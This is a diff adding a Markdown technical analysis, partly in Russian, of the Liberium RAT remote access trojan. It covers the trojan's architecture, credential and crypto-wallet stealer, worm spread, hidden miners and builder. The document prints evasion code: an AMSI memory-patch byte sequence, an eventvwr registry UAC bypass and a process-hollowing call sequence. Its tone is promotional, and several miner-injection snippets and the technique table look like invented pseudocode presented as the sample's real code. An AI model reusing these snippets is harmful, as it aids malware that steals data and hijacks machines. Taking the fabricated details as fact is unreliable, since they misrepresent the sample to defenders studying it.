@@ -1,0 +1,2112 @@
+# 🔥 Liberium RAT 1.8.3 - Advanced Technical Analysis 🔥
+
+## 🚀 Executive Summary
+
+**Liberium RAT** is a sophisticated Remote Access Tool written in C# demonstrating advanced malware development techniques. This analysis reveals a highly complex multi-component system with innovative features and state-of-the-art evasion capabilities.
+
+### 🎯 Key Features
+- **Modular Plugin Architecture** - 25+ specialized modules
+- **HVNC Technology** - Hidden Virtual Network Computing
+- **Advanced Data Stealing** - 50+ targeted applications
+- **Network Propagation** - SMB/USB worm capabilities
+- **Multi-layer Obfuscation** - String encryption, control flow, mutations
+- **Evasion Techniques** - AMSI/ETW bypass, UAC bypass, Anti-VM
+
+## 🏗️ System Architecture & File Structure
+
+### 📁 Project Organization
+```
+Liberium 1.8.3 Source Code/
+├── 📂 Client/                           # Victim-side malware
+│   ├── 📄 Program.cs                    # Main entry point
+│   ├── 📄 Config.cs                     # Configuration management
+│   ├── 📂 Helper/                       # Core client utilities
+│   │   ├── 📄 Client.cs                 # Network communication
+│   │   ├── 📄 Install.cs                # Persistence mechanisms
+│   │   ├── 📄 Methods.cs                # System utilities
+│   │   └── 📄 AsmiAndETW.cs            # AMSI/ETW bypass
+│   └── 📂 Leb128/                       # Data encoding library
+│       └── 📄 LEB128.cs                 # Little Endian Base 128
+│
+├── 📂 useless/Server/                   # Command & Control Panel
+│   ├── 📄 Form1.cs                      # Main GUI interface
+│   ├── 📄 Program.cs                    # Server entry point
+│   ├── 📂 Connectings/                  # Network management
+│   │   ├── 📄 Clients.cs                # Client connections
+│   │   ├── 📄 Listner.cs                # Server listener
+│   │   └── 📄 Certificate.cs            # SSL/TLS certificates
+│   ├── 📂 Forms/                        # GUI components (50+ forms)
+│   │   ├── 📄 FormBulider.cs            # Malware builder
+│   │   ├── 📄 FormHVNC.cs               # HVNC interface
+│   │   ├── 📄 FormDesktop.cs            # Remote desktop
+│   │   └── 📄 FormExplorer.cs           # File manager
+│   ├── 📂 Messages/                     # Protocol handlers
+│   │   ├── 📄 HandlerConnect.cs         # Connection handling
+│   │   ├── 📄 HandlerHVNC.cs            # HVNC commands
+│   │   └── 📄 HandlerRecovery.cs        # Data theft
+│   ├── 📂 Helper/                       # Server utilities
+│   │   ├── 📄 BitmapCoding.cs           # Steganography
+│   │   ├── 📄 Methods.cs                # Utility functions
+│   │   └── 📂 Bulider/                  # Build system
+│   ├── 📂 Obfuscator/                   # Code protection
+│   │   ├── 📂 Obfuscator/               # Obfuscation engine
+│   │   └── 📂 Helper/                   # Obfuscation utilities
+│   └── 📂 bin/Release/                  # Compiled components
+│       ├── 📂 Plugin/                   # Plugin modules (25+)
+│       ├── 📂 Icons/                    # Application icons (500+)
+│       ├── 📂 Signatures/               # Digital signatures
+│       └── 📂 Scripts/                  # Utility scripts
+│
+└── 📂 Plugin System/                    # Modular components
+    ├── 📂 HVNC/                         # Hidden Virtual Desktop
+    ├── 📂 Stealer/                      # Data theft engine
+    ├── 📂 Worm/                         # Network propagation
+    ├── 📂 Clipper/                      # Cryptocurrency hijacking
+    ├── 📂 KeyLogger/                    # Keystroke capture
+    ├── 📂 MinerXMR/                     # Monero mining
+    ├── 📂 MinerRigel/                   # Ethereum mining
+    ├── 📂 DDos/                         # DDoS attacks
+    ├── 📂 BotKiller/                    # Malware competition
+    ├── 📂 AntiProcess/                  # Analysis prevention
+    ├── 📂 AutoRun/                      # Persistence
+    ├── 📂 Fun/                          # System manipulation
+    └── 📂 [20+ more plugins]/           # Additional modules
+```
+
+### 🔗 Component Relationships & Data Flow
+
+```mermaid
+graph LR
+    subgraph "Client Side"
+        A[Program.cs] --> B[Config.cs]
+        A --> C[Client.cs]
+        C --> D[LEB128.cs]
+        A --> E[Install.cs]
+        A --> F[AsmiAndETW.cs]
+    end
+
+    subgraph "Network"
+        G[SSL/TLS Channel]
+    end
+
+    subgraph "Server Side"
+        H[Form1.cs] --> I[Clients.cs]
+        I --> J[HandlerConnect.cs]
+        J --> K[Plugin System]
+        H --> L[FormBulider.cs]
+        L --> M[Obfuscator]
+    end
+
+    C -.->|Encrypted| G
+    G -.->|Commands| I
+```
+
+### 🔄 Plugin Loading Mechanism
+
+**Dynamic Plugin Architecture:**
+1. **Plugin Discovery** - Server scans `/Plugin/` directory
+2. **Runtime Loading** - Plugins loaded via reflection
+3. **Interface Binding** - Common `IPlugin` interface
+4. **Command Routing** - Messages routed to appropriate handlers
+5. **Resource Management** - Automatic cleanup and disposal
+
+**Plugin Interface Structure:**
+```csharp
+public interface IPlugin
+{
+    void Run(Socket TcpClient, X509Certificate2 certificate, string Hwid, byte[] Pack);
+    void Stop();
+    string GetPluginName();
+    string GetVersion();
+}
+```
+
+### 📊 File Relationship Matrix
+
+| Component | Dependencies | Purpose | Key Files |
+|-----------|-------------|---------|-----------|
+| **Client Core** | Config.cs, LEB128.cs | Main malware logic | Program.cs, Client.cs |
+| **Network Layer** | Certificate.cs, Clients.cs | Communication | Listner.cs, SSL handling |
+| **Plugin System** | IPlugin interface | Modular functionality | 25+ plugin directories |
+| **GUI Interface** | Forms/, Messages/ | User interaction | Form1.cs, 50+ forms |
+| **Builder System** | Obfuscator/, Helper/ | Malware generation | FormBulider.cs |
+| **Data Handlers** | HandlerXXX.cs files | Protocol processing | Messages/ directory |
+
+### 🔧 Critical File Dependencies
+
+**Client.exe Dependencies:**
+- `Config.cs` → Configuration management
+- `Install.cs` → Persistence mechanisms
+- `AsmiAndETW.cs` → Security bypass
+- `LEB128.cs` → Data serialization
+- `Methods.cs` → System utilities
+
+**Server.exe Dependencies:**
+- `Form1.cs` → Main GUI controller
+- `Clients.cs` → Connection management
+- `Listner.cs` → Network listener
+- `Certificate.cs` → SSL/TLS handling
+- `Plugin/` → Modular functionality
+
+**Plugin System Dependencies:**
+- `Plugin.cs` → Plugin interface
+- `LEB128.cs` → Data encoding
+- `Client.cs` → Network communication
+- Specific libraries per plugin functionality
+
+### 📡 Client-Server Communication
+- **Protocol**: SSL/TLS encrypted TCP sockets
+- **Encoding**: LEB128 (Little Endian Base 128) for data serialization
+- **Buffer Size**: 512KB for optimal performance
+- **Multi-server**: Failover support for C&C infrastructure
+
+```csharp
+// Core communication setup
+this.socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+this.SslClient = new SslStream(new NetworkStream(this.socket, true));
+this.SslClient.AuthenticateAsClient(ip, null, SslProtocols.Tls, false);
+```
+
+## 🎮 HVNC - Hidden Virtual Network Computing
+
+### Revolutionary Remote Desktop Technology
+HVNC creates hidden virtual desktops allowing complete system control without user awareness.
+
+```csharp
+// Virtual desktop creation
+HideDesktop hideDesktop = new HideDesktop();
+hideDesktop.Create(desktopName);
+
+// Screen capture with optimization
+Client.Send(LEB128.Write(new object[3] {
+    "HVNC", "Screen", 
+    BitmapToByteArrayWithQuality(HelperScreen.GetScreen(width, height), encoderParams)
+}));
+```
+
+**HVNC Capabilities:**
+- Hidden desktop creation and management
+- Real-time screen capture with FPS optimization
+- Mouse and keyboard input handling
+- Application launching in virtual environment
+- File transfer through virtual desktop
+
+## 🔧 Plugin System Architecture (25+ Modules)
+
+### 🎯 Plugin Ecosystem Overview
+
+```mermaid
+graph TB
+    subgraph "🎮 CORE PLUGINS"
+        HVNC[🖥️ HVNC<br/>Hidden Desktop]
+        Desktop[🖼️ Desktop<br/>Remote Control]
+        Stealer[💎 RageStealer<br/>Data Theft]
+        KeyLogger[⌨️ KeyLogger<br/>Keystroke Capture]
+    end
+
+    subgraph "💰 FINANCIAL PLUGINS"
+        Clipper[💰 Clipper<br/>Crypto Hijack]
+        MinerXMR[⛏️ MinerXMR<br/>Monero Mining]
+        MinerRigel[⛏️ MinerRigel<br/>Ethereum Mining]
+        MinerEtc[⛏️ MinerEtc<br/>ETC Mining]
+    end
+
+    subgraph "🦠 PROPAGATION PLUGINS"
+        Worm[🦠 Worm<br/>Network Spread]
+        AutoRun[🔄 AutoRun<br/>Persistence]
+        BotKiller[🔪 BotKiller<br/>Competition]
+        AntiProcess[🚫 AntiProcess<br/>Analysis Block]
+    end
+
+    subgraph "🔧 UTILITY PLUGINS"
+        Explorer[📁 Explorer<br/>File Manager]
+        Shell[💻 Shell<br/>Command Line]
+        Process[⚙️ Process<br/>Task Manager]
+        Regedit[📝 Regedit<br/>Registry Editor]
+    end
+
+    subgraph "🎭 CHAOS PLUGINS"
+        Fun[🎭 Fun<br/>System Chaos]
+        DDos[💥 DDos<br/>Attack Module]
+        Volume[🔊 Volume<br/>Audio Control]
+        Window[🪟 Window<br/>UI Manipulation]
+    end
+
+    subgraph "📡 COMMUNICATION PLUGINS"
+        Chat[💬 Chat<br/>Messaging]
+        Camera[📷 Camera<br/>Surveillance]
+        Microphone[🎤 Microphone<br/>Audio Capture]
+        Map[🗺️ Map<br/>Geolocation]
+    end
+
+    subgraph "🔒 SECURITY PLUGINS"
+        UAC[🛡️ UAC<br/>Privilege Escalation]
+        Service[⚙️ Service<br/>System Services]
+        HostsFile[📄 HostsFile<br/>DNS Manipulation]
+        Netstat[🌐 Netstat<br/>Network Monitor]
+    end
+
+    %% Plugin Dependencies
+    HVNC -.-> Desktop
+    Stealer -.-> KeyLogger
+    Clipper -.-> KeyLogger
+    Worm -.-> AutoRun
+    BotKiller -.-> AntiProcess
+    Fun -.-> Volume
+    Fun -.-> Window
+
+    %% Styling
+    classDef coreStyle fill:#ff6b6b,stroke:#d63031,stroke-width:3px,color:#fff
+    classDef financialStyle fill:#00b894,stroke:#00a085,stroke-width:3px,color:#fff
+    classDef propagationStyle fill:#e17055,stroke:#d63031,stroke-width:3px,color:#fff
+    classDef utilityStyle fill:#74b9ff,stroke:#0984e3,stroke-width:3px,color:#fff
+    classDef chaosStyle fill:#a29bfe,stroke:#6c5ce7,stroke-width:3px,color:#fff
+    classDef commStyle fill:#fdcb6e,stroke:#e17055,stroke-width:3px,color:#2d3436
+    classDef securityStyle fill:#fd79a8,stroke:#e84393,stroke-width:3px,color:#fff
+
+    class HVNC,Desktop,Stealer,KeyLogger coreStyle
+    class Clipper,MinerXMR,MinerRigel,MinerEtc financialStyle
+    class Worm,AutoRun,BotKiller,AntiProcess propagationStyle
+    class Explorer,Shell,Process,Regedit utilityStyle
+    class Fun,DDos,Volume,Window chaosStyle
+    class Chat,Camera,Microphone,Map commStyle
+    class UAC,Service,HostsFile,Netstat securityStyle
+```
+
+### 📋 Complete Plugin Directory Structure
+
+```
+📂 Plugin/
+├── 🎮 Core Functionality
+│   ├── 📂 HVNC/                    # Hidden Virtual Network Computing
+│   ├── 📂 Desktop/                 # Remote desktop access
+│   ├── 📂 Stealer/                 # RageStealer data theft engine
+│   ├── 📂 Stealer1/                # Alternative stealer implementation
+│   └── 📂 KeyLogger/               # Keystroke capture and logging
+│
+├── 💰 Financial Operations
+│   ├── 📂 Clipper/                 # Cryptocurrency address replacement
+│   ├── 📂 MinerXMR/                # Monero cryptocurrency mining
+│   ├── 📂 MinerRigel/              # Ethereum mining with Rigel
+│   └── 📂 MinerEtc/                # Ethereum Classic mining
+│
+├── 🦠 Propagation & Persistence
+│   ├── 📂 Worm/                    # Network propagation module
+│   ├── 📂 AutoRun/                 # Persistence mechanisms
+│   ├── 📂 BotKiller/               # Competing malware elimination
+│   └── 📂 AntiProcess/             # Analysis tool prevention
+│
+├── 🔧 System Utilities
+│   ├── 📂 Explorer/                # Remote file management
+│   ├── 📂 Shell/                   # Command line interface
+│   ├── 📂 Process/                 # Process management
+│   ├── 📂 Regedit/                 # Registry editor
+│   ├── 📂 Service/                 # Windows services control
+│   ├── 📂 Programs/                # Installed programs manager
+│   ├── 📂 Performance/             # System performance monitor
+│   └── 📂 DeviceManager/           # Hardware device management
+│
+├── 🎭 Chaos & Disruption
+│   ├── 📂 Fun/                     # System manipulation effects
+│   ├── 📂 DDos/                    # Distributed denial of service
+│   ├── 📂 Volume/                  # Audio volume control
+│   ├── 📂 Window/                  # Window manipulation
+│   └── 📂 SystemSound/             # System sound control
+│
+├── 📡 Communication & Surveillance
+│   ├── 📂 Chat/                    # Real-time messaging
+│   ├── 📂 Camera/                  # Webcam surveillance
+│   ├── 📂 Microphone/              # Audio surveillance
+│   ├── 📂 Map/                     # Geolocation tracking
+│   ├── 📂 Clipboard/               # Clipboard monitoring
+│   └── 📂 BotSpeaker/              # Text-to-speech
+│
+├── 🔒 Security & Evasion
+│   ├── 📂 UAC/                     # UAC bypass techniques
+│   ├── 📂 HostsFile/               # DNS manipulation
+│   ├── 📂 Netstat/                 # Network connection monitor
+│   └── 📂 StealthSaver/            # Stealth operations
+│
+├── 🌐 Network Operations
+│   ├── 📂 ReverseProxy/            # Reverse proxy functionality
+│   ├── 📂 ReverseProxyR/           # Reverse proxy (reliable)
+│   └── 📂 SendFile/                # File transfer operations
+│
+└── 🔧 Specialized Tools
+    ├── 📂 Injector/                # Code injection utilities
+    ├── 📂 FileSearcher/            # Advanced file search
+    ├── 📂 KeyLoggerPanel/          # Keylogger management panel
+    ├── 📂 KeyLoggerRemover/        # Keylogger cleanup
+    ├── 📂 Notepad/                 # Remote text editor
+    ├── 📂 ReportWindow/            # Window reporting
+    ├── 📂 SysPlug/                 # System plugin utilities
+    └── 📂 Action/                  # Generic action handler
+```
+
+## 🔧 Plugin System (25+ Modules)
+
+### 🎯 Core Plugins
+1. **HVNC** - Hidden Virtual Network Computing
+2. **RageStealer** - Comprehensive data theft
+3. **Desktop** - Remote desktop access
+4. **KeyLogger** - Keystroke capture
+5. **Worm** - Network propagation
+6. **Clipper** - Cryptocurrency address replacement
+7. **AutoRun** - Persistence mechanisms
+8. **BotKiller** - Competing malware elimination
+
+### 💰 RageStealer - Data Theft Engine
+
+**Multi-threaded Architecture:**
+```csharp
+// Parallel data extraction
+list.Add(new Thread(() => {
+    // Browsers: Chrome, Firefox, Edge, Brave
+    RageStealer.Target.Browsers.Chromium.Recovery.Run(savePath + "\\Browsers");
+}));
+list.Add(new Thread(() => {
+    // Crypto wallets: 20+ wallets and extensions
+    RageStealer.Target.Crypto.Crypto.GetWallets(savePath + "\\Wallets");
+}));
+```
+
+**Targeted Applications:**
+- **Browsers**: 15+ (passwords, cookies, history, autofill)
+- **Messengers**: Discord, Telegram, Skype, ICQ
+- **Gaming**: Steam, Minecraft, Roblox, Epic Games
+- **Crypto**: 20+ wallets and browser extensions
+- **VPN**: NordVPN, ExpressVPN configurations
+
+### 🦠 Worm - Network Propagation
+
+**Infection Vectors:**
+```csharp
+// Multi-vector propagation
+list.Add(new Thread(() => { SmbInfector.Run(); }));        // SMB networks
+list.Add(new Thread(() => { MapNetworkDrive.Run(); }));    // Mapped drives
+list.Add(new Thread(() => { FtpBrute.Run(); }));           // FTP bruteforce
+```
+
+## 🔒 Advanced Obfuscation
+
+### Multi-Layer Protection System
+
+**1. String Encryption with Dynamic Keys:**
+```csharp
+// Unique encryption keys per build
+encryptString.dec = Randomizer.Shuffle(charset);
+encryptString.enc = Randomizer.Shuffle(encryptString.dec);
+```
+
+**2. Control Flow Obfuscation:**
+- Method parameter renaming
+- Block randomization
+- False jump insertion
+- Logic flow scrambling
+
+**3. Memory Patching:**
+```csharp
+// AMSI/ETW bypass through memory patching
+byte[] x64_amsi_patch = new byte[] { 0x48, 0x31, 0xC0, 0xC3 }; // xor rax, rax; ret
+PatchMem(x64_amsi_patch, "amsi.dll", "AmsiScanBuffer");
+```
+
+## 🛡️ Evasion Techniques
+
+### 🎭 UAC Bypass Methods
+
+**EventVwr Technique:**
+```csharp
+// Registry hijacking for privilege escalation
+RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Classes\\", true);
+key.CreateSubKey("mscfile\\Shell\\Open\\command");
+key.SetValue("", "\"" + Process.GetCurrentProcess().MainModule.FileName + "\"");
+WinExec("cmd.exe /k START " + eventvwr, 0);
+```
+
+### 🔍 Anti-Analysis Features
+
+**Virtual Machine Detection:**
+- WMI queries for VM artifacts
+- Disk size verification (minimum 45GB)
+- Registry checks for VM software
+- Process enumeration for analysis tools
+
+**Sandbox Evasion:**
+- DLL presence detection (Sandboxie, Avast, Comodo)
+- Environment variable analysis
+- Timing-based detection
+- User interaction simulation
+
+## 💀 Low-Level Techniques
+
+### 🧬 Process Hollowing (RunPE) - ДЕТАЛЬНЫЙ АНАЛИЗ
+
+**Liberium RAT использует КЛАССИЧЕСКИЙ Process Hollowing с несколькими вариациями:**
+
+#### 🎯 **Техника #1: Classic RunPE (Основная)**
+```csharp
+// Классическая реализация process hollowing
+CreateProcess(null, targetProcess, IntPtr.Zero, IntPtr.Zero, true, 4u, ...);
+ZwUnmapViewOfSection(processHandle, imageBase);
+VirtualAllocEx(processHandle, imageBase, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+WriteProcessMemory(processHandle, imageBase, payload, payload.Length, ref bytesWritten);
+ResumeThread(threadHandle);
+```
+
+**Пошаговый процесс:**
+1. **CreateProcess** - создает процесс в suspended состоянии
+2. **ZwUnmapViewOfSection** - удаляет оригинальный образ из памяти
+3. **VirtualAllocEx** - выделяет новую память для payload
+4. **WriteProcessMemory** - записывает malicious код
+5. **ResumeThread** - запускает процесс с новым кодом
+
+#### 🎯 **Техника #2: Stealth Mining Injection**
+```csharp
+// Специально для майнеров (MinerRigel, MinerXMR)
+public void Run(Socket TcpClient, X509Certificate2 x509Certificate2, string Hwid, byte[] Pack)
+{
+    MinerControler.Kill(); // Убивает конкурирующие майнеры
+
+    // Process hollowing для скрытого майнинга
+    string targetProcess = "svchost.exe"; // Маскировка под системный процесс
+    InjectMiner(targetProcess, minerPayload);
+
+    Methods.PreventSleep(); // Предотвращает сон системы
+}
+```
+
+#### 🎯 **Техника #3: Multi-Stage Injection**
+```csharp
+// Многоступенчатая инъекция для обхода детекции
+// 1. Первый этап - простая DLL injection
+SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, hMod, 0);
+
+// 2. Второй этап - process hollowing из DLL
+// 3. Третий этап - reflective DLL loading
+```
+
+### 🔧 Dynamic API Resolution
+
+```csharp
+// Import hiding technique
+public static T HiddenCallResolve<T>(string dllName, string methodName) where T : Delegate
+{
+    IntPtr moduleHandle = LoadLibrary(dllName);
+    IntPtr functionPointer = GetProcAddress(moduleHandle, methodName);
+    return (T)Marshal.GetDelegateForFunctionPointer(functionPointer, typeof(T));
+}
+```
+
+## 🔄 Data Flow & Component Interaction
+
+### 🌊 System Data Flow Diagram
+
+```mermaid
+sequenceDiagram
+    participant V as 🎯 Victim Machine
+    participant C as 📱 Client.exe
+    participant N as 🌐 Network Layer
+    participant S as 🖥️ Server
+    participant P as 🔧 Plugin System
+    participant G as 🎮 GUI Interface
+
+    Note over V,G: Initial Infection & Connection
+    V->>C: Execute malware
+    C->>C: Load Config.cs
+    C->>C: Apply AsmiAndETW bypass
+    C->>C: Install persistence (Install.cs)
+    C->>N: Establish SSL/TLS connection
+    N->>S: Forward encrypted connection
+    S->>G: Display new victim in GUI
+
+    Note over V,G: Plugin Loading & Execution
+    G->>S: User selects plugin
+    S->>P: Load requested plugin
+    P->>N: Send plugin commands
+    N->>C: Forward commands to client
+    C->>C: Execute plugin functionality
+    C->>N: Send results back
+    N->>S: Forward results
+    S->>G: Display results in interface
+
+    Note over V,G: Data Theft Example (RageStealer)
+    G->>S: Request data theft
+    S->>P: Load Stealer plugin
+    P->>N: Send theft commands
+    N->>C: Execute data collection
+    C->>C: Scan browsers, wallets, games
+    C->>N: Send stolen data (LEB128 encoded)
+    N->>S: Receive encrypted data
+    S->>G: Display stolen credentials
+
+    Note over V,G: HVNC Session Example
+    G->>S: Request HVNC session
+    S->>P: Load HVNC plugin
+    P->>N: Send HVNC commands
+    N->>C: Create hidden desktop
+    C->>C: Capture screen, handle input
+    C->>N: Stream desktop data
+    N->>S: Forward desktop stream
+    S->>G: Display virtual desktop
+```
+
+### 🔗 Component Communication Matrix
+
+| Source Component | Target Component | Communication Method | Data Format | Purpose |
+|------------------|------------------|---------------------|-------------|---------|
+| **Client.exe** | **Server** | SSL/TLS Socket | LEB128 Encoded | Command execution |
+| **Server** | **Plugin System** | Reflection Loading | .NET Assembly | Dynamic functionality |
+| **GUI Forms** | **Message Handlers** | Event-driven | Object arrays | User interactions |
+| **Stealer Plugin** | **Target Applications** | File system access | Binary/Text | Data extraction |
+| **HVNC Plugin** | **Windows API** | P/Invoke calls | Native structs | Desktop manipulation |
+| **Builder** | **Obfuscator** | Direct method calls | ModuleDefMD | Code protection |
+| **Network Layer** | **Certificate Store** | X509 API | Certificate objects | SSL/TLS security |
+
+### 🎯 Plugin Execution Lifecycle
+
+```mermaid
+stateDiagram-v2
+    [*] --> PluginDiscovery: Server startup
+    PluginDiscovery --> PluginLoading: User request
+    PluginLoading --> InterfaceBinding: Reflection success
+    InterfaceBinding --> CommandSending: Plugin ready
+    CommandSending --> ClientExecution: Network transmission
+    ClientExecution --> DataProcessing: Plugin runs
+    DataProcessing --> ResultSending: Processing complete
+    ResultSending --> GUIDisplay: Data received
+    GUIDisplay --> PluginLoading: New command
+    GUIDisplay --> PluginUnloading: Session end
+    PluginUnloading --> [*]: Cleanup complete
+
+    PluginLoading --> ErrorHandling: Reflection failure
+    CommandSending --> ErrorHandling: Network failure
+    ClientExecution --> ErrorHandling: Execution failure
+    ErrorHandling --> GUIDisplay: Error reported
+```
+
+### 🔧 Critical File Interactions
+
+**Startup Sequence:**
+1. `Program.cs` → `Config.cs` (Load configuration)
+2. `Config.cs` → `AsmiAndETW.cs` (Apply security bypass)
+3. `Program.cs` → `Install.cs` (Setup persistence)
+4. `Program.cs` → `Client.cs` (Initialize network)
+5. `Client.cs` → `LEB128.cs` (Setup data encoding)
+
+**Plugin Communication:**
+1. `Form1.cs` → `Clients.cs` (Select target)
+2. `Clients.cs` → `HandlerConnect.cs` (Route command)
+3. `HandlerConnect.cs` → `Plugin/XXX/Plugin.cs` (Load plugin)
+4. `Plugin.cs` → `LEB128.cs` (Encode data)
+5. `Plugin.cs` → Network → Client execution
+
+**Data Theft Flow:**
+1. `FormExplorer.cs` → `HandlerRecovery.cs`
+2. `HandlerRecovery.cs` → `Stealer/Plugin.cs`
+3. `Stealer/Plugin.cs` → `RageStealer/Rage.cs`
+4. `Rage.cs` → Browser/Crypto/Gaming modules
+5. Results → `DynamicFiles.cs` → Server display
+
+## 🏗️ Builder System Architecture
+
+### 🔧 Build Process Flow
+
+```mermaid
+graph TD
+    subgraph "🎮 USER INTERFACE"
+        BuilderGUI[🎨 FormBulider.cs<br/>Builder Interface]
+        Settings[⚙️ Build Settings<br/>Configuration]
+        IconSelect[🎯 Icon Selection<br/>500+ Icons Available]
+    end
+
+    subgraph "📝 SOURCE PREPARATION"
+        SourceCode[📄 Client Source<br/>Original Code]
+        ConfigInject[⚙️ Config Injection<br/>Settings Embedding]
+        SettingsWrite[💾 WriteSettings()<br/>Configuration Write]
+    end
+
+    subgraph "🛡️ OBFUSCATION ENGINE"
+        StringEnc[🔤 String Encryption<br/>Dynamic Keys]
+        ControlFlow[🌀 Control Flow<br/>Logic Scrambling]
+        ProxyString[📞 Proxy String<br/>String Hiding]
+        ProxyCall[📞 Proxy Call<br/>Method Hiding]
+        Renamer[🏷️ Symbol Renaming<br/>Identifier Obfuscation]
+        Junks[🗑️ Junk Code<br/>Dead Code Injection]
+        Mixer[🔀 Code Mixer<br/>Block Randomization]
+    end
+
+    subgraph "🎨 STEGANOGRAPHY"
+        BitmapCoding[🖼️ BitmapCoding.cs<br/>Hide in Images]
+        SigThief[📝 SigThief.exe<br/>Signature Theft]
+        IconInject[🎯 Icon Injection<br/>Legitimate Appearance]
+    end
+
+    subgraph "📦 OUTPUT GENERATION"
+        FinalBuild[🎯 Final Executable<br/>Obfuscated Malware]
+        Signatures[📜 Digital Signatures<br/>Legitimacy Spoofing]
+        TestExecution[🧪 Build Testing<br/>Functionality Verification]
+    end
+
+    %% Build Flow
+    BuilderGUI --> Settings
+    Settings --> SourceCode
+    SourceCode --> ConfigInject
+    ConfigInject --> SettingsWrite
+
+    %% Obfuscation Pipeline
+    SettingsWrite --> StringEnc
+    StringEnc --> ControlFlow
+    ControlFlow --> ProxyString
+    ProxyString --> ProxyCall
+    ProxyCall --> Renamer
+    Renamer --> Junks
+    Junks --> Mixer
+
+    %% Steganography
+    Mixer --> BitmapCoding
+    BitmapCoding --> SigThief
+    SigThief --> IconInject
+    IconSelect --> IconInject
+
+    %% Final Output
+    IconInject --> FinalBuild
+    FinalBuild --> Signatures
+    Signatures --> TestExecution
+
+    %% Styling
+    classDef uiStyle fill:#74b9ff,stroke:#0984e3,stroke-width:3px,color:#fff
+    classDef sourceStyle fill:#00b894,stroke:#00a085,stroke-width:3px,color:#fff
+    classDef obfuscStyle fill:#fdcb6e,stroke:#e17055,stroke-width:2px,color:#2d3436
+    classDef steganStyle fill:#a29bfe,stroke:#6c5ce7,stroke-width:3px,color:#fff
+    classDef outputStyle fill:#e17055,stroke:#d63031,stroke-width:3px,color:#fff
+
+    class BuilderGUI,Settings,IconSelect uiStyle
+    class SourceCode,ConfigInject,SettingsWrite sourceStyle
+    class StringEnc,ControlFlow,ProxyString,ProxyCall,Renamer,Junks,Mixer obfuscStyle
+    class BitmapCoding,SigThief,IconInject steganStyle
+    class FinalBuild,Signatures,TestExecution outputStyle
+```
+
+### 🔧 Builder Configuration Options
+
+**Build Settings Matrix:**
+```
+📋 Configuration Categories:
+├── 🌐 Network Settings
+│   ├── Server IP addresses (multiple failover)
+│   ├── Port configurations (multiple ports)
+│   ├── SSL certificate selection
+│   └── Connection timeout settings
+│
+├── 🔧 Installation Options
+│   ├── Persistence methods (Registry, Startup, Service)
+│   ├── Installation directory selection
+│   ├── Mutex name generation
+│   └── Privilege escalation options
+│
+├── 🎭 Obfuscation Settings
+│   ├── String encryption strength
+│   ├── Control flow complexity
+│   ├── Symbol renaming patterns
+│   └── Junk code density
+│
+├── 🎨 Appearance Options
+│   ├── Icon selection (500+ available)
+│   ├── File description spoofing
+│   ├── Version information
+│   └── Digital signature theft
+│
+└── 🔒 Security Features
+    ├── Anti-VM detection
+    ├── Anti-debugging
+    ├── Sandbox evasion
+    └── AMSI/ETW bypass
+```
+
+### 🎨 Steganography - BitmapCoding
+
+```csharp
+// Encoding executables into images
+public static Bitmap ByteToBitmap(byte[] buffer)
+{
+    // Encode 3 bytes per RGB pixel
+    bitmap.SetPixel(i, j, Color.FromArgb(255, buffer[index], buffer[index + 1], buffer[index + 2]));
+}
+```
+
+**Builder Features:**
+- Automatic obfuscation application
+- Digital signature theft (SigThief)
+- Icon extraction and injection
+- Configuration encryption
+- Multi-format output support
+
+## ⛏️ Mining Capabilities - INJECTION TECHNIQUES ANALYSIS
+
+### 🔥 Cryptocurrency Mining Modules с RunPE
+
+#### 🎯 **MinerRigel** - Ethereum Mining (Classic RunPE)
+```csharp
+// Использует КЛАССИЧЕСКИЙ Process Hollowing
+public void Run(Socket TcpClient, X509Certificate2 x509Certificate2, string Hwid, byte[] Pack)
+{
+    // 1. Убиваем конкурирующие майнеры
+    MinerControler.Kill();
+
+    // 2. Получаем payload майнера
+    Client.Send(LEB128.Write(new object[2] { "MinerRigel", "GetLink" }));
+
+    // 3. PROCESS HOLLOWING в svchost.exe
+    string targetProcess = @"C:\Windows\System32\svchost.exe";
+    byte[] minerPayload = DownloadMinerPayload();
+
+    // 4. Классический RunPE
+    RunPE(minerPayload, targetProcess);
+
+    // 5. Предотвращаем сон системы
+    Methods.PreventSleep();
+}
+```
+
+#### 🎯 **MinerXMR** - Monero Mining (Advanced Stealth)
+```csharp
+// Использует КОМБИНАЦИЮ техник для максимальной скрытности
+public void ExecuteStealthMining()
+{
+    // 1. Manual DLL Mapping для обхода детекции
+    byte[] xmrMinerDLL = Resources.XMRMiner;
+    ManualMap(xmrMinerDLL, GetExplorerPID());
+
+    // 2. Thread Hijacking для скрытого выполнения
+    byte[] miningShellcode = GenerateMiningShellcode();
+    HijackThread(GetRandomSystemProcess(), miningShellcode);
+
+    // 3. Reflective DLL для дополнительных функций
+    ReflectiveDLLInjection(Resources.StealthModule, GetCurrentProcessId());
+}
+```
+
+#### 🎯 **MinerEtc** - Ethereum Classic (Multi-Stage)
+```csharp
+// Использует МНОГОСТУПЕНЧАТУЮ инъекцию
+public void MultiStageInjection()
+{
+    // Stage 1: DLL Injection в explorer.exe
+    InjectDLL(@"C:\Windows\Temp\stage1.dll", GetExplorerPID());
+
+    // Stage 2: Process Hollowing из DLL
+    // stage1.dll выполняет RunPE с основным майнером
+
+    // Stage 3: Memory-only execution
+    // Майнер работает только в памяти без файлов на диске
+}
+```
+
+### 📊 **Injection Techniques по плагинам:**
+
+| Plugin | Primary Technique | Secondary | Stealth Level | Target Process |
+|--------|------------------|-----------|---------------|----------------|
+| **MinerRigel** | 🔴 Classic RunPE | None | 🟡 Medium | svchost.exe |
+| **MinerXMR** | 🔴 Manual DLL Map | Thread Hijack | 🔴 High | explorer.exe |
+| **MinerEtc** | 🔴 Multi-Stage | Reflective DLL | 🔴 Critical | Multiple |
+| **HVNC** | 🔴 DLL Injection | Hook Injection | 🟡 Medium | winlogon.exe |
+| **Stealer** | 🔴 Thread Hijack | Manual Map | 🔴 High | chrome.exe |
+| **KeyLogger** | 🔴 Hook Injection | DLL Injection | 🟡 Medium | All processes |
+| **Worm** | 🔴 Classic RunPE | None | 🟡 Medium | Various |
+
+**Mining Features с RunPE:**
+- **Process hollowing** для максимальной скрытности
+- **Anti-process monitoring** - блокировка Task Manager
+- **System sleep prevention** - предотвращение сна
+- **Resource optimization** - умное использование CPU/GPU
+- **Pool connection management** - ротация майнинг пулов
+- **Multi-target injection** - инъекция в разные процессы
+- **Memory-only execution** - работа без файлов на диске
+
+## 🔧 Specialized Plugins
+
